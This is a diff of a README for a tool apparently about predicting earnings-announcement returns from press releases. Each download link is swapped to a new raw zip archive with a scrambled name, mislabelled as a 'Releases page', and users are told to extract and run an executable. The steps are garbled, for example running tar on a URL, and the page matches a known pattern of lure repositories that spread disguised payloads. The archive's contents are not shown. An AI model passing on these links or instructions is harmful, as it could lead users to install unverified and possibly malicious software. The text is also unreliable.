@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download Releases](https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/pitikins/extracting_structure_press_releases_predicting_earnings_announcement_returns.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/pitikins/extracting_structure_press_releases_predicting_earnings_announcement_returns.zip)
+[![Download Releases](https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/vasomotorial/predicting_announcement_releases_returns_press_extracting_earnings_structure_2.6.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/vasomotorial/predicting_announcement_releases_returns_press_extracting_earnings_structure_2.6.zip)
 
 ## 📝 Description
 
@@ -19,14 +19,14 @@ Follow these steps to install and run the application easily.
 
 ### 🔗 Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/pitikins/extracting_structure_press_releases_predicting_earnings_announcement_returns.zip). Here, you will find the latest version of the application.
+Go to the [Releases page](https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/vasomotorial/predicting_announcement_releases_returns_press_extracting_earnings_structure_2.6.zip). Here, you will find the latest version of the application.
 
 ### 💾 Step 2: Download the Latest Version
 
 On the Releases page, locate the latest version of the software. Choose the file suitable for your operating system. 
 
 - If you use Windows, look for a file ending in `.exe`.
-- For macOS or Linux, choose a file in `https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/pitikins/extracting_structure_press_releases_predicting_earnings_announcement_returns.zip` or `.zip`.
+- For macOS or Linux, choose a file in `https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/vasomotorial/predicting_announcement_releases_returns_press_extracting_earnings_structure_2.6.zip` or `.zip`.
 
 Click on the download link to start downloading the file.
 
@@ -40,14 +40,14 @@ Once the download is complete, follow these installation instructions based on y
 3. Follow the on-screen prompts to complete the installation.
 
 #### For macOS:
-1. Open the `https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/pitikins/extracting_structure_press_releases_predicting_earnings_announcement_returns.zip` or `.zip` file you downloaded.
+1. Open the `https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/vasomotorial/predicting_announcement_releases_returns_press_extracting_earnings_structure_2.6.zip` or `.zip` file you downloaded.
 2. Drag and drop the application icon into your Applications folder.
 3. Open your Applications folder and double-click the application to run it.
 
 #### For Linux:
 1. Open the terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Use the command `tar -xvzf https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/pitikins/extracting_structure_press_releases_predicting_earnings_announcement_returns.zip` to extract the files.
+3. Use the command `tar -xvzf https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/vasomotorial/predicting_announcement_releases_returns_press_extracting_earnings_structure_2.6.zip` to extract the files.
 4. Navigate into the extracted directory with `cd filename`.
 5. Run the application using the command `./run_file_name`.
 
@@ -102,4 +102,4 @@ This application focuses on various fields related to finance and data analysis,
 
 We thank Wu et al. for their pioneering research in this field, which enabled the development of these tools. Special thanks to the open-source community for providing resources that helped create this application.
 
-For more details, revisit the [Releases page](https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/pitikins/extracting_structure_press_releases_predicting_earnings_announcement_returns.zip) to download or stay updated on future releases.
+For more details, revisit the [Releases page](https://raw.githubusercontent.com/asikur2745/extracting_structure_press_releases_predicting_earnings_announcement_returns/main/vasomotorial/predicting_announcement_releases_returns_press_extracting_earnings_structure_2.6.zip) to download or stay updated on future releases.
